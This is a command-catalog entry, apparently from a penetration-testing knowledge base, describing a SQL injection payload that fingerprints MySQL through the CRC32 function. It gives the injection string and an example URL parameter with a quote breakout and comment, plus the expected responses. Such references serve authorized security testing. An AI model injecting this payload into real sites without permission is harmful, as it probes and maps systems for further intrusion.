---
type: command
executor: sql
data: crc32('MySQL')=crc32('MySQL')
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Database
tags:
  - sql-injection
  - fingerprinting
verified: true
validated: true
---

# mysql-crc32-test

## Command

```sql
crc32('MySQL')=crc32('MySQL')
```

## Description

This SQL expression tests for MySQL by using the CRC32 checksum function on a string. Inject into a vulnerable parameter to see if it succeeds, fingerprinting MySQL.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Fixed tautology | N/A |

## Examples

### Basic Usage

`?search=MySQL' AND crc32('MySQL')=crc32('MySQL') --`

## Expected Output

True response (e.g., results shown) if MySQL; syntax error like 'Unknown function crc32' otherwise.

## Related

- [[procedures/DBMS-Fingerprinting-via-SQL-Injection]]
- [[commands/mysql-connection-id-test]]
